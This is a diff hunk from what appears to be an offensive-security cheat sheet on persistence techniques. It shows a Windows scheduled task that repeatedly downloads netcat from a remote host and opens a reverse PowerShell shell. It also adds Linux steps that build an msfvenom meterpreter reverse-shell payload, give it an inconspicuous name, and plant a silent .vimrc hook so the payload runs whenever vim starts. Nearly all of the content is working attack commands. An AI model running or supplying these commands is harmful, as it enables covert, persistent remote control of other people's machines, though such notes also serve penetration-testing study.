@@ -17,5 +17,18 @@ To create a scheduled task that runs every 3 minutes, as current user, downloads
 ```powershell
 schtasks /create /tn "Payback1" /sc minute /mo 3 /tr "powershell.exe -c wget http://192.168.14.10/nc64.exe -o C:\users\Public\nc64.exe;C:\Users\Public\nc64.exe 192.168.14.10 8080 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
 ```
+## Tool: Vim (Linux)
 
+The following works when a local user can run vim as sudo:
 
+- Create a meterpreter payload in ELF format. Choose the name that doesn't raise suspicion:
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.188 LPORT=4444 -f elf > .vim_rc
+```
+- Upload it to the target machine (/home/<username> should be ideal)
+- Add the following line in .vimrc file (if it does not exist, create one). This is a vim configuration file and loads everytime vim / vi is started.
+
+```bash
+:silent !/home/ptlabmachine/.vim_rc &
+```  
+- The above command will run ```.vim_rc``` file in silent mode as a job in the background. This is necessary to eliminate all user interruptions while executing the reverse shell code.  
